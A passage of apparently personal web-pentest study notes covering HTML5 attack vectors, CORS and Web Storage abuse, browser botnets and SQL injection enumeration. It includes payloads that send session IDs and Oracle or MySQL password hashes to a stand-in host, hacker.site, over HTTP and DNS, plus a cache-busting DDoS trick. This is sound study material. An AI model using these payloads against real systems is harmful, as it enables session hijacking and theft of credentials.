        "tags": ["advanced","pentest","web"],
        "url": "/notes/ewptx/csrf/",
        "teaser": "/assets/images/posts/ewptx/ewptx-teaser6.jpg"
      },{
        "title": "6 - HTML5",
        "excerpt":"  HTLM5   Intro  We do not need to analyze the entire HTML5 RFC and its related features; However, what we are going to explore in this Recap section is the major features that are interesting from a security perspective.   Semantics  Enrichment of the semantics that web devs can give to their apps. These include new media elements, form types, attributes, and many others. From security point of view, these become new attack vectors and ways to bypass security measures.   Form Elements  The keygen element is one of the new Form Elements. It was introduced to generate a key-pair client side. The most interesting attribute it supports is autofocus. This is useful in triggering XSS without user interaction.   Example:  &lt;form action=\"#\" method \"GET\"&gt;   Encryption: &lt;keygen name=\"security\" autofocus onfocus=\"alert(1);\"&gt;   &lt;input type=\"submit\"&gt; &lt;/form&gt;   Media Elements  # Both &lt;video&gt; and &lt;audio&gt; are commonly ysed to evade XSS filters. In addition, &lt;source&gt;, &lt;track&gt; and &lt;embed&gt; are also useful due to the fact that they support the 'src' attribute  # Example:  &lt;embed src=\"http://hacker.site/evil.swf\"&gt; &lt;embed src=\"javascript:alert(1)\"&gt;   Semantic / Structural Elements   There are many other elements introduced to improve the semantic and the structure of a page, such as:  &lt;article&gt; &lt;figure&gt; &lt;footer&gt; &lt;header&gt; &lt;main&gt; &lt;mark&gt; &lt;nav&gt; &lt;progress&gt; &lt;section&gt; &lt;summary&gt; &lt;time&gt;      All of them support Global and Event Attributes, both old and new.    Attributes  There is a huge list of new events and some interesting examples are:  onhashchange onformchange onscroll onresize ...   Example:  &lt;body onhashchange=\"alert(1)\"&gt;   &lt;a href=\"#\"&gt; Click me&lt;/a&gt;   Offile &amp; Storage  A real world example is TiddlyWiki: http://tiddlywiki.com/      Some of the major features, related to this evolution are Application Cache and Web Storage (alias Client-Side Storage or Offile storage)   Web Storage – Attack Scenarios  The attack scenarios may vary from Session Hijacking, User Tracking, Disclosure of Confidential Data, as well as a new way to store attack vectors.   Session Hijacking  If a dev chooses to store session IDs by using sessionStorage instead of cookies, its still possible to perform session hijacking by leveraging an XSS flaw.  new Image().src=\"http://hacker.site/SID?\"+escape(sessionStorage.getItem('sessionID')); // usually was document.cookie   Web storage solutions do not implement security mechanisms to mitigate the risk of malicious access to the stored information (see HttpOnly)   Offline Web Application – Attack Scenarios     With Offline Web apps, the most critical security issue is Cache Poisoning.   The offile apps can also cache SSL-resources and the root directory of a website.   Device Access  A feature introduced by the HTML5 specs is Geolocation API   →  http://www.w3.org/TR/geolocation-API/      This is a way to provide scripted access to identify a users positions based on GPS coordinates (lat and long)    Geolocation – Attack Scenarios  This API access can not only be used For user tracking, physical and cross-domain, but also For breaking anonymity.   Fullscreen Mode – Attack Scenario  Another API that allows a single element (images, videos, etc) to be viewed in full-screnn mode.   → https://dvcs.w3.org/hg/fullscreen/raw-file/tip/Overview.html      This API can be used For Phishing Attacks.   Example, sending a phishing page in full screen mode and loading a fake victim website in the background with a image that simulates the browser header, adress bar, etc.   Performance, Integration &amp; Connectivity  Many new features such as:      Drag and Drop, HML editing and Workers( Web and Shared) Improvements are also made on communications, with features such as:   WebSocket and XMLHttpRequest2.   Attack Scenarios  Interactive XSS, with Drag and Drop, to Remove Shell, port scanning and web-based botnets exploiting the new communication features like WebSocket.      Its also possible to manipulate the history stack with methods to add and remove locations, thus allowing history tampering attacks.   Sec POV, the most important features introduced are:  Content Security Policy Cross-Origin Resource Sharing Cross-Document Messaging  strengthening of iframe with the Sandboxed attribute.  - http://www.w3.org/TR/CSP/ - http://www.w3.org/TR/cors/ - https://html.spec.whatwg.org/multipage/web-messaging.html - http://www.w3.org/TR/html5/embedded-content-0.html#attr-iframe-sandbox   Exploiting HTML5  Which may affect the most widespread technologies introduced by HTML5   CORS Attack Scenarios  The same origin restrictions began to become more restrictive rather than helpful. In order to relax the SOP, a new specification has been introduced called: Cross-Origin Resource Sharing.   → http://www.w3.org/TR/cors/   It uses a set of HTTP headers.   → http://www.w3.org/TR/cors/#syntax      These allow both server and browser to communicate in relation to which requests are or not allowed.    Universal Allow  The first CORS headers is Access-Control-Allow-Origin, which indicates whether a resource can be shared or not.   This is based upon it returning the value of the Origin request header, *, or null in the response:  Access-Control-Allow-Origin = \"Access-Control-Allow-Origin\" \":\" origin-list-or-null | \"*\"   Allow by Wildcar Value *  Generally this is not a required behavior, but rather a matter of laziness of the implementer. This is one of the most common misconfigurations with CORS headers.   How to abuse?  - If XSS is found on the page served with 'Access-Control-Allow-Origin *', it can be used to infect or impersonate users. - Tricking users to access a controlled website and making a COR query to their internal resources in order to read the responses. - Use the users as a proxy to exploit vulnerabilities, therefore leveraging the fact that the HTTP Referrer header is often not logged.   Universal Allow  In CORS, the Access-Control-Allow-Credentials indicates that the request can include user credentials. http://www.w3.org/TR/cors/#user-credentials   Allow by Server-side  Allowing COR from all domains with credentials included:  &lt;?php header('Access-Control-Allow-Origin: '+$_SERVER['HTTP_ORIGIN']); header('Access-Control-Allow-Credentials: true');   By design, this implementation allows CSRF.      Any origin will be able to read the anti-CSRF tokens from the page, therefore consenting any domain on the internet to impersonate the web application users.    Weak Access Control  CORS specifications provide a request header named Origin. It indicates where the COR or Preflight Request originates from.      The header can be spoofed by creating requests outside of the browsers. For example, one can use a proxy or using tool like cURL, Wget, etc.   Check Origin Example  Suppose that a victim.site supports CORS and, not only reveals sensitive information to friendly origins, but also reveals simple information to everyone.   By using CURL its possible to bypass the access control by setting the Origin header to the allowed value: friend.site.   In so doing, its possible to read the sensitive information sent:  curl http://victim.site/html5/CORAaccessContro.php # normal output  curl --header 'Origin: http://hacker.site' http://victim.site/... # normal output  curl --header 'Origin: http://friend.site' http://victim.site/... # sensitive information found   Intranet Scanning  Its also possible to abuse COR in order to perform time-based intranet scanning.      Send XHR to either an arbritrary IP address or domain names and, depending on the response time, establish wheter a host is up or a specific port is open.   JS-Recon  Its a HTML5 based Javascript Network Reconnaissance tool   → https://web.archive.org/web/20120313125925/http:/www.andlabs.org/tools/jsrecon/jsrecon.html   Which features like COR and Web Sockets in order to perform both network and port scanning from the browser.      Also useful to guessing users private IP addresses.    Remote Web Shell  If an XSS flaw is found in an app that supports CORS, an attacker can hijack the victim session, establishing a communication channel between the victims browser and the attcker.   The Shell of the Future  → https://web.archive.org/web/20150223205517/http:/www.andlabs.org/tools/sotf/sotf.html   Its a Reverse Web Shell handler, it can be used to hijack sessions where JavaScript can be inject using XSS or through the browsers address bar. It makes use of HTML5 Cross Origin Requests and can bypass anti-session hijacking measures like Http-Only cookies and IP address-Session ID binding…   Storage Attacks Scenarios  → https://tools.ietf.org/html/rfc6265#section-6.1   Web Storage  Its the first stable HTML5 specification that rules two well known mechanisms: Session Storage and Local Storage.   The implementations are similar to cookies and they are also known as key-value storage and DOM storage. Anything can be converted to a string or serialized and stored:  window.(localStorage|sessionStorage).setItem('name','Joao'); #         DOM properties                       Key     Value      http://www.w3.org/TR/webstorage/#security-storage      The main issue with this technology is that developers are not aware of the security concerns presented in this specification, which clearly reports the security risks this feature may introduce.    Session Hijacking  In the case of an XSS attack, Web Storage is a property of the Window object; therefore, its accessible via the DOM and, in a similar fashion to cookies, it can be compromised.   The exploitation is similar to the one used For cookies, but the only difference is in the API used to retrieve the values:  &lt;script&gt; new Image.src = \"http://hacker.site/C.php?cc=\" +escape(sessionStorage.getItem('sessionID')); &lt;/script&gt;      HTTP cookies have attributes, such as HTTPOnly, that were introduced to stop the session hijacking phenomena.   This security measure, however, is completely missing For WebStorage technologies, making it completely inappropriate For storing both session identifiers and sensitive information   Cross-Directory Attacks  Another important difference is that, unlike HTTP cookies, there is no feature to restrict the access by pathname, making the Web Storage content available in the whole origin. This may also introduce Cross-Directory attacks.      This is typical For various social networks like facebook, or universities.   Example:      If a XSS flaw is found in the university path uni.edu/~professorX, its possible to read all stored data in all the directories available in the university domain uni.edu.   Using Tracking and Confidential Data Disclosure  Its possible to perform User Traking if websites use Web Storage objects to store information about users behaviors rather than HTTP Cookies.   IndexedDB  When working with structured data, it does not provide an efficient mechanism to search over values.   To address these limitations, two options that HTML5 introduced:  - IndexedDB - http://www.w3.org/TR/IndexedDB/ - Web SQL Databse - http://www.w3.org/TR/webdatabase/ // the second was deprectated in 2010      webSQL database is a relational database access system, whereas IndexedDB is an indexed table system.   Indexed Database API is an HTML5 API introduced For high performance searches on client-side storage. The idea is that this storage would hold significantamounts of structured, indexed data, thereby giving developers an efficient client-side querying mechanism.        Its a transactional technology, however, not relational. The database system saves key-value pairs in object stores and allows searching data by using indexes also known as keys.       The primary risks are related to information leakage and information spoofing   IndexedDB follows the Same-Origin Policy but limits the use to HTTP and HTTPS in all browser except Internet Explorer.   This also allows ms-wwa and ms-wwa-web protocols For their apps in the new Windows UI format.   Web Messaging Attack Scenarios  → http://www.w3.org/TR/webmessaging/   This is also referred as Cross Document Messaging or postMessage (API name)   Communications between the embedded iframes and the hosting website are now possible.   DOM XSS  This occurs if the postMessage data received is used without validation. Such as innerHTML, write, etc:  ... // Say Hello var hello = document.getElementById(\"hellobox\"); hello.innerHTML = \"Hello \"+e.data; // HTMLElement Sink           User controlled values   Origin Issue  The Web Messaging Protocl allows the presence of the Origin header field   The Origin header is not mandatory, but it can help reduce the attack surface by both limiting the interaction with trusted origins and reducing the likelihood of a Client-side DoS:  if (e.origin != 'http://trusted.site'){ // Origin not allowed return; }   As we have seen with CORS, even if it cannot be done via browser, the origin header can be spoofed by creating requests outside the browser.   Web Sockets Attack Scenarios  → http://tools.ietf.org/html/rfc6455   → http://www.w3.org/TR/websockets/   HTML5 Web Sockets can provide a 500:1 or –depending on the size of the HTTP headers - even a 1000:1 reduction in unnecessary HTTP header traffic and 3:1 reduction in latency.   That is not just an incremental improvement; that is a revolutionary jump.      If we are able to execute JavaScript code inside the victim browser, its possible to establish a Web Socket connection and perform our malicious operations.    Data validation  One of the simplest data validation issues to find may be XSS and while looking For it, we might also find other types of Injections concerning both client-side and server-side.   MiTM  WebSocket Protocol standard defines two schemes For web socket connections:  xs  = unencrypted xss = encrypted   If the implementation uses the unencrypted channel, we have a MiTM issue whereby, anybody on the network can see and manipulate the traffic.   Remote Shell  If we are able to execute JavaScript code on the victim browser, by either exploiting an XSS flaw or tricking the victim into visiting a malicious website, we could conveniently establish a full Web Socket connection and, as a result, have a Remote Shell active until the window/tab is closed.   Network Reconnaissance  Nice tools to test both scenarios JS-Recon   → https://web.archive.org/web/20120313125925/http:/www.andlabs.org/tools/jsrecon/jsrecon.html   Web Workers Attack Scenarios  → http://www.w3.org/TR/workers/   Web workers is the solution, introduced by HTML5, to allow thread-like operations within web browsers. it allows most modern browser to run Javascript in the background.   Methods like setTimeout, setInterval or even XMLHttpRequest, provided a valid solution to achieving parallelism by using thread-like messaging.   Two types:  Dedicated Web Workers: http://www.w3.org/TR/workers/#dedicated-workers-and-the-worker-interface Shared Web Workers: http://www.w3.org/TR/workers/#shared-workers-and-the-sharedworker-interface      A dedicated workers can only be accessed through the script that created it, while the shared one can be accessed by any script from the same domain.   It did not introduce new threats, but increased the performance and feasibility of the attack.   Browser-Based Botnet  We can run the Javascript code on all the browsers that support the features the bot uses. This also includes any OS that can run a browser, even on televisions, gaming console, etc.   Two stages:  - 1. Infect the victims: XSS, email spam, social engineering... - 2. Manage Persistence: the malicious code will work until the victim browser is closed.   Sometimes, implementing a game can help u keep the victim on the malicious page. If the game is both interactive and especially addictive, the user may remain online the entire day.   With an HTML5 Botnet, some of the possibel attacks that can be performed are:  Email Spam Distributed Password Cracking DDoS Attacks Phishing Data Mining Intranet Reconnaissance   Distributed Password Cracking     Ravan   → http://web.archive.org/web/20160315031218/http:/www.andlabs.org/tools/ravan.html      A system based on WebWorkers to perform password cracking of MD5, SHA1, SHA256, SHA512 hashes.    WebWorkers + CORS - DDoS Attacks  Adding CORS we could generate a large number of GET/POST requests to a remote website. We would be using COR requests to perform a DDoS attack.      We dont care if the response is blocked or wrong, we care about sending as many requests as possible.   To bypass the CORS limitation, add facke parameters in the query-string. It will force the browser to transform each request, therefore identifying it as unique:  http://victim.site/dossable.php?search=X x = use random values here   Security Measures   Security Headers: X-XSS-Protection  To protect against Reflected XSS attacks   Security Headers: X-Frame-Options  Prevent Clickjacking      This header introduced a way For the server to instruct the browser on wheter to display the transmitted content in frame of other web pages.   Syntax:  X-Frame-Options: value  # DENY = the page cannot be displayed in a frame, regardless of the site attempting to do so. # SAMEORIGIN = The page can only be displayed in a frame on the same origin as the page itself. # ALLOW-FROM URI = The page can only be displayed in a frame on the specific origin.   Security Headers: Strict-Transport-Security (HSTS)  → http://tools.ietf.org/html/rfc6797   It allows a server to declare itself accessible only via secure connections. It also allows For users to be able to direct their user agents to interact with given sites over secure connections only.   To enable this mechanism, the response header Strict-Transport-Security is required. (its not supported by all vendors.   → http://caniuse.com/#feat=stricttransportsecurity   Syntax:  Strict-Transport-Security: max-age=&lt;delta-seconds&gt;; includeSubDomains  # One year in cache is 'max-age=31536000' (Optional) # While to remove or 'not cache' is max-age=0   Security Headers: X-Content-Type-Options  To indicate a specific resource, web server use the response header Content-Type which contains a standard MIME type( text/html, image/png, etc) with some optional parameters (character set)   →  attack scenarios - http://blog.fox-it.com/2012/05/08/mime-sniffing-feature-or-vulnerability/   The most common is Content Sniffing XSS   → http://www.adambarth.com/papers/2009/barth-caballero-song.pdf      This header instructs the browser to not guess the content type of the resource and trust of the Content-Type header.   Syntax:  X-Content-Type-Options: nosniff // only works on IE and Chrome   Security Headers: Content Security Policy (CSP)  Its a defende mechanism that can significantly reduce the risk impact of a broad class of content injection vulnerabilities. These include XSS and UI Redressing in modern browsers.   Headers adopted:  X-Content-Security-Policy and X-WebKit-CSP   CSP uses a collection of directives in order to define a specific set of whitelisted sources of trusted content   → http://www.w3.org/TR/CSP/#directives   The most common is script-src = http://www.w3.org/TR/CSP/#script-src:   Content-Security-Policy: script-src 'self' https://other.web.site  //                   Directive Name      Values // 1 Defines which scripts the protected resource can execute // 2 the allowed sources of scripts   Directives work in default-allow mode. This simply means that if a specific directive does not have a policy defined, then its equal to ‘*’; thus, every source is a valid source.   The default-src directive will be applied to all the unspecified directives:  Content-Security-Policy: default-src 'self'   With CSP, its also possible to deny resources. For example, if the web app does not need plugins or to be framed, then the policy can be enriched as follow:  Content-Security-Policy: default-src https://my.web.site; object-src 'none'; frame-src 'none' // 'none' returns an empty set For the allowed sources   CSP specification: http://www.w3.org/TR/CSP/   Defines the following list directives:  default-src script-src object-src style-src img-src media-src frame-src font-src connect-src report-uri // reporting feature sandbox    // optional   There are four keywords that are also allowed:  none - no sources self - current origin, but not its subdomains unsafe-inline - allows inline JavaScript and CSS unsafe-eval - allows text-to-JavaScript sinks like 'eval, alert, setTimeout...'  // These keywords must be used with single-quotes, otherwise they refer to server named none, self, etc   Report violations mechanism:  Content-Security-Policy: default-src 'self'; report-uri /csp_report; // once a violation is detected, the browser will perform a POST request to the path specified, sending a JSON object, similar to the one on the next slide.   Example:  {   \"csp-report\": {     \"document-uri\":\"http://my.web.site/page.html\",     \"referrer\":\"http://hacker.site/\",     \"blocked-uri\":\"https://hacker.site/xss_test.js\",     \"violated-directive\":\"script-src 'self'\",     \"original-policy\":\"script-src 'self'; report-uri http://my.web.site/csp_report\"   } }   CSP Playground  To test CSP options  http://www.cspplayground.com/   UI Redressing - The x-Jacking Art  A category of attacks that aim to change visual elements in a user interface in order to conceal malicious activities.   Example such as:  - Overlaying a visible button with an invisible one - Changing the cursos position  - Manipulating other elements in the user interface - Also known as ClickJacking, LikeJacking, StrokeJacking, FileJacking and others   ClickJacking  This attack uses a nested iframe from a target website and a little bit of CSS magic.   A submission button or whatever the attack chooses to trigger an action:  For example: **find willie**, when clicked it triggers the attack   LikeJacking  → http://nakedsecurity.sophos.com/2010/05/31/facebook-likejacking-worm/      The target are social networks and their features.   THe likes are perceived as popularity and quality nowadays, so there is ways to buy likes to give the public this wrong perception   StrokeJacking  → http://seclists.org/fulldisclosure/2010/Mar/232   A technique to hijack keystrokes, is proof that UI Redressing is not only all about hijacking clicks.   Example:  http://blog.andlabs.org/2010/04/stroke-triggered-xss-and-strokejacking_06.html   New Attack Vectors in HTML5   Drag-and-Drop:      With html5 this drag-and-drop mechanims has been transformed into something natively supported by all desktop-based browsers.   Text Field Injection  The first technique allows the attacker-controller to drag data into hidden text fields/forms on different origins.   → http://blog.kotowicz.net/2011/03/exploiting-unexploitable-xss-with.html   Content Extraction  Allow us to extract content from areas we cannot access. (restricted areas). In this scenario, we must trick the victim into dragging their private data into areas under our control.      In order to trick the victim so we can extract content from the targeted web page, we must know what to extract and where it is located.   If the secret is part of a URL, is an HTML anchor element or an image, dragging is easy. Cause the elements will be converted into a serialized URL.      Its difficult when the content is not draggable like textual content. So we need to trick the victim to select first before dragging.   We could use the view-source: to load the HTML source code into an iframe.   Example:  &lt;iframe src=\"view-source:http://victim.site/secretInfo/\"&gt;&lt;/iframe&gt;      however, this technique only works on Firefox, without the NoScript add-on.    ","categories": ["notes","ewptx"],
        "tags": ["advanced","pentest","web"],
        "url": "/notes/ewptx/html5/",
        "teaser": "/assets/images/posts/ewptx/ewptx-teaser7.jpg"
      },{
        "title": "7 - SQL Injection",
        "excerpt":"  SQL Injection   Basic understanding of SQL Injection Vulnerabilities   Advanced concept of exploiting SQLi’s   Introduction  We are going to lay the foundation For an advanced comprehension of what the SQL Injection world offers. We will analyze the most common DBMS and learn how to perform advanced attacks against them.   Recap and More  SQL Injection is an attack against the original purpose a developer has chosen For a specific piece of SQL code. The idea is to alter the original SQL query structure by leveraging the syntax, DBMS and/or OS functionalities in order to perform malicious operations.   We’ll analyze 3 most used Relational Database Management Systems RDBMS:  - MySQL - SQL Server - Oracle   Exploiting SQLI   Techniques Classification  Classes of attack:  - INBAND - OUT-OF-BAND - INFERENCE   Inbound Attacks  It leverages the same channel used to inject the SQL code   The result of this attack is included directly in the response from the vuln web application.   The most common techniques are:  - UNION-based - Error-based   Out-of-Band Attacks (OOB)  It uses alternative channels to extract data from the server.   Some of these include the following:  - HTTP(s) requests - DNS resolution - Email - File System      Exploiting a SQLi using OOB methods is useful when all Inband techniques have failed because attempted vectors have been disabled, limited, or filtered. When the only option is to use Blind techniques (Inference), reducing the number of queries is a must!   HTTP Based OOB Exploitation:  - it sends the result of the SQL query by HTTP request, usually via GET, toward a hacker-controlled HTTP server   Inference Attacks     Most common known as Blind.   All methods that allow information extraction are based on a set of focused deductions. There are several possible techniques to use, but the most common are:   Boolean-based   Time-based   Boolean-based  The focus in on visible changes inside web server responses. For example:   If the result of a query is not NULL, the server returns Great while Nooo otherwise.   Example:  - Is the first character of the username a 'G'? - If yes = 'great' / if no = 'nooo'   Time-based  The focus is on the delays of response   Example:  - Is the first character of the username a 'G'? - if yes = 'waits 15 seconds' / if not = 'answer imediately any message'   Gathering Information from the Environment  Before exploiting  we need to understand some basic fundamentals about our backend DBMS   Fingerprint techniques may vary under:  - Non-Blind - Blind   Our Goals:  - DMBS version - Databases structure and Data - Database Users and their privileges   Identifying the DBMS   Error Code Analysis  The most straightforward method consists of forcing the vuln app to return an error message. The more verbose the server errors are the better.   Banner Grabbing  Sometimes, the error code analysis does not return any details, like the exact version and patch level; however, it does return the database name.   The best way to identify the DBMS is by leveraging the NON-Blind scenario. Every DB implements specific functions that return the current version, so retrieving that value is straightforward.   *example in images   Educated Guessing     If we are facing a BLIND scenario, we can execute Educated Guessing of whats behind the injection point.   String Concatenation     Each DBMS handles strings differently, making the way which String Concatenation is handled even more interesting.   example in images   Numeric Functions  If the injection point is evaluated as a number, we can perform the same approach, but with numeric functions *example in images   SQL Dialect  We can use Date and Time Functions (see NOW()+0 in MySQL) or specific Miscellaneous DBMS Functions (see UID in Oracle). And many more…   Another options, is how comments are handled.  - MySQL: https://dev.mysql.com/doc/refman/8.0/en/comments.html   MySQL provides a variant to C-Style comments:  /*! MySQL-specific code */   This is helpful to do a good obfuscator technique.   Example:  SELECT 1 /*!50530 + 1 */  # executed only by server MySQL 5.5.30 or higher   Enumerating the DBMS Content  The smartest way to begin is by enumerating in this order:  - Databases schemas - Tables - Columns - Users   This info is also known as metadata, system catalog or data dictionary   In MySQL  → https://dev.mysql.com/doc/refman/8.0/en/information-schema.html   Information_schema is the magic place where we can retrieve all the metadata required.   All the info about the other databases are stored within the table SCHEMATA.  SELECT schema_name FROM information_schema.schemata;   If the user running MySQL has SHOW privileges, then the previous command can be condensed into this:  SHOW databases; SHOW schemas;   MySQL provides a list of useful functions and operators   → https://dev.mysql.com/doc/refman/8.0/en/information-functions.html   We can use:  SELECT DATABASE(); SELECT SCHEMA();  In MSSQL  All the system-level information is stored within the System Tables:  http://msdn.microsoft.com/en-us/library/ms179932.aspx   Depending on the version, these tables exists either only in the MASTER database or in every database  https://docs.microsoft.com/en-us/sql/relational-databases/databases/master-database?redirectedfrom=MSDN&amp;view=sql-server-ver15   Info about the databases is stored in the system table: sysdatabases   query:  SELECT name FROM master..sysdatabases; SELECT name FROM sysdatabases;   The alternative is SYSTEM VIEWS → http://msdn.microsoft.com/en-us/library/ms177862.aspx   The most interesting views:  - Compability: http://msdn.microsoft.com/en-us/library/ms187376.aspx - Information: http://msdn.microsoft.com/en-us/library/ms186778.aspx - Schema     : http://msdn.microsoft.com/en-us/library/ms186778.aspx   For a mapping between System Tables and System Views:  http://msdn.microsoft.com/en-us/library/ms187997.aspx   We can also use Catalog view:  SELECT name FROM SYS.databases;   We can leverage a utility function:  SELECT DB_NAME();   Providing a smallint ID, so we can retrieve info about a specific database:  SELECT DB_NAME(1);   A list of names and IDs:  SELECT dbid, DB_NAME(dbid) from master..sysdatabases;  In Oracle   It does not have a simple model system like the previous two.   Concepts to understand:  Database: Where are stored the physical files Instance: The pool of processes, memory areas, etc. Useful to access data.   Each DATABASE must point to an INSTANCE that has its custon logical and physical structures in order to store information like tables, indexes, etc.   The most important structure: TABLESPACE   List the TABLESPACE the current user can use:  SELECT TABLESPACE_NAME FROM USER_TABLESPACES   SYSTEM and SYSAUX are the system TABLESPACE created automatically at the beginning when the database is made.   If we want to retrieve the default TABLESPACE:  SELECT DEFAULT_TABLESPACE FROM USER_USERS SELECT DEFAULT_TABLESPACE FROM SYS.USER_USERS # The USER_USERS is the table in SYS that describes the current user   Tables &amp; Columns   MySQL  → http://dev.mysql.com/doc/refman/5.0/en/tables-table.html   INFORMATION_SCHEMA.TABLES is the table that provides information about tables in the databases managed.   We can run the following query:  SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;   The alias:  SHOW TABLES; //current schema SHOW TABLES in EMPLOYEES; // other database   The columns are within the INFORMATION_SCHEMA.COLUMNS:  SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS;   with alias:  SHOW COLUMNS FROM DEPARTMENTS IN EMPLOYEES; # cols in a table, database   MSSQL  Information about tables are stored within sysobjects   → http://technet.microsoft.com/en-us/library/aa260447(v=sql.80).aspx   This table contains info about all the objects defined For that specific schema:  SELECT name FROM sysobjects WHERE xtype='U'   To retrieve the list of tables: // add the name of the database before sysobjects  SELECT name FROM employees..sysobjects WHERE xtype='U'  # the xtype defines objects types: - S  = System Table - U  = User Table - TT = Table Type - X  = Extended Stored Procedure - V  = Views   Alternative, INFORMATION_SCHEMA views we can retrieve info about tables and views of the current database  SELECT table_name FROM INFORMATION_SCHEMA.TABLES SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type = 'BASE TABLE'   For a specific database just add the name of the db before:  SELECT table_name FROM employees.INFORMATION_SCHEMA.TABLES SELECT table_name FROM employees.INFORMATION_SCHEMA.TABLES WHERE table_type = 'BASE TABLE'   Enumeration of columns is similar:  SELECT name FROM syscolumns SELECT name FROM employees.syscolumns   Alternative, using INFORMATION_SCHEMA:  SELECT column_name FROM INFORMATION_SCHEMA.columns SELECT column_name FROM employees.INFORMATION_SCHEMA.columns SELECT column_name FROM employees.INFORMATION_SCHEMA.columns WHERE table_name='salary'   Oracle  ts a simple query  # https://docs.oracle.com/cd/B28359_01/server.111/b28320/statviews_2105.htm#REFRN20286  SELECT table_name, tablespace_name FROM SYS.all_tables SELECT table_name, tablespace_name FROM all_tables   There is a special table in Oracle name DUAL  https://docs.oracle.com/cd/B19306_01/server.102/b14200/queries009.htm  SELECT \"WAPTx\" FROM DUAL;  # Is useful For computing a constant expression with the SELECT statement   MSSQL  The system view ALL_TAB_COLUMNS   https://docs.oracle.com/cd/B28359_01/server.111/b28320/statviews_2091.htm   Its useful in enumerating the columns of the tables, views and clusters accessible to the currrent user:  SELECT column_name FROM SYS.ALL_TAB_COLUMNS SELECT column_name FROM ALL_TAB_COLUMNS   Database Users and Privileges   MySQL  Some useful functions to do the job:  User()        # FUNCTIONS Current_user() System_user() Session_user() Current_user  # CONSTANT   If the user is privileged:  SELECT user FROM mysql.user;   The privileges are all stored in INFORMATION_SCHEMA   And organized by the tables:  COLUMN_PRIVILEGES SCHEMA_PRIVILEGES TABLE_PRIVILEGES() USER_PRIVILEGES   It can be retrieve like that:  SELECT grantee,privilege_type FROM INFORMATION_SCHEMA.USER_PRIVILEGES;   To show privileges on databases:  SELECT grantee, table_schema, privilege_type FROM INFORMATION_SCHEMA.SCHEMA_PRIVILEGES;   To show privileges from respective columns:  SELECT user, select_priv,..., FROM MYSQL.USER;   To gather the DBA accounts:  SELECT grantee, privilege_type FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE privilege_type='SUPER';   Privileged users need to change the query:  SELECT user FROM MYSQL.USER WHERE Super_priv='Y';   MSSQL  Its similar to mysql   We have some functions:  suser_sname() //FUNCTION User          // CONSTANTS System_user   We can also use the System Table:  SELECT loginame FROM SYSPROCESSES WHERE spid = @@SPID # Current User Process ID  # http://msdn.microsoft.com/en-us/library/ms189535.aspx  SELECT name FROM SYSLOGINS; # all users   We can use System Views:  SELECT original_login_name FROM SYS.DM_EXEC_SESSIONS WHERE status='running' # current active user   Once we identified the users, we need to understand their privileges:   IS_SRVOLEMEMBER = http://msdn.microsoft.com/en-us/library/ms176015.aspx   IF IS_SRVOLEMEMBER('sysadmin')=1 # print 'Current users login is a member of the sysadmin role'  ELSE IF IS_SRVOLEMEMBER('sysadmin')=0 # print 'Current users login is NOT a member of the sysadmin role'   In addition to sysadmin, there are other possibles roles:  serveradmin dbcreator setupadmin bulkadmin securityadmin diskadmin public processadmin   We can use this function to ask about other users:  SELECT IS_SRVOLEMEMBER ('processadmin','aw') # aw is the name of the SQL Server login to check. If the username is supplied as an argument, its the current user.   Whos the owner of what?  # http://msdn.microsoft.com/en-us/library/ms174355.aspx  SELECT loginname FROM SYSLOGINS where sysadmin=1   Or we can use System View server_principals:  SELECT name FROM SYS.SERVER_PRINCIPALS where TYPE='S' # S = SQL login   Oracle  To retrieve the current user:  SELECT user FROM DUAL   Alternatively:  SELECT username FROM USER_USERS SELECT username FROM ALL_USERS   User privileges:  SELECT grantee FROM DBA_ROLE_PRIVS SELECT username FROM USER_ROLE_PRIVS   The current users session privileges:  SELECT role FROM SESSION_ROLES   To retrieve an overview of all the data dictionaries, tables and view:  SELECT * FROM DICTIONARY SELECT * FROM DICT  SQLI Classifications:      We can infer the DBMS version by observing the replies to different concatenation syntaxes:      Numeric functions:      Out-of-Band Exploitation   Useful when facing Special-Blind SQL Injection scenarios. In these situations, we cannot rely on the inferential techniques to retrieve data.   These will not work cause the results are being limited, filtered, and so forth; therefore, we need to opt For another CHANNEL to carry this information.   Alternative OOB CHannels  The most relevant:  HTTP DNS email Database Connections   OOB via HTTP  We can leverage the HTTP channel For the DBMS systems that provide features For accessing data on the internet over HTTP using SQL      Using these features, we can create a query to a web resource controlled by the hacker and then control the access log For analyzing all the requests arrived.   Only Oracle provide this feature natively   Two techniques [ Oracle ]:  UTL_HTTP  # HTTPURIType: https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/t_dburi.htm#BGBGAHAA   Oracle URL_HTTP package →  https://docs.oracle.com/cd/B19306_01/appdev.102/b14258/u_http.htm      It can use both via SQL and PL/SQL   Two useful funcions:  REQUEST REQUEST_PIECES   Only the REQUEST can be used in a SQL query:  SELECT UTL_HTTP.REQUEST ('hacker.site/'||(SELECT spare4 FROM SYS.USER$ WHERE ROWNUM=1)) FROM DUAL;   The REQUEST_PIECES must be used within a PL/SQL Block *example in images   Oracle HTTPURITYPE Package      The first one is often disabled   We can also exfiltrate information via HTTP:  SELECT HTTPURITYPE ('hacker.site'/||(SELECT spare4 FROM SYS.USER$ WHERE ROWNUM=1)).getclob() FROM DUAL;  # getclob() method returns the character large object (CLOB), but we can also use other methods such as: GETBLOB(), GETXML() and GETCONTENTTYPE()   OOB via DNS  In this context, instead of controlling the web server we have to control a DNS server.      Even if the administrator sets an aggressive firewall policy filtering out any outgoing connections, the victim site will still both be able to reply to requests and perform DNS queries.       The server uses a DNS resolver configured by the network administrator, but the resolver needs to contact a DNS server under the attackers control, therefore giving back the results of the injection to the attacker.   As a requirement the hacker must have access to the DNS Server.      The server must be registered as the authoritative name server For that Zone (e.g. hacker.site)    Provoking DNS Requests   MySQL (win)   Function: LOAD_FILE() reads the file and returns the file contents as a string:  SELECT LOAD_FILE(\"C:\\\\Windows\\\\system.uni\");   We can exploit this function and provoke DNS requests by requesting a UNC path like this: \\[data].hacker.site  SELECT LOAD_FILE(CONCAT('\\\\\\\\', 'SELECT password FROM mysql.user WHERE user=\\'root\\'','.hacker.site'));   MSSQL  We can provoke DNS requests by using UNC Paths as we did with MySQL   We can use the extended stored procedure MASTER..XP_FILEEXIST to determine whether a particular file exists on the disk or not.  EXEC MASTER..XP_FILEEXIST 'C:\\Windows\\system.ini'      2 alternatives are XP_DIRTREE and XP_SUBDIRS   moreover in images   Oracle  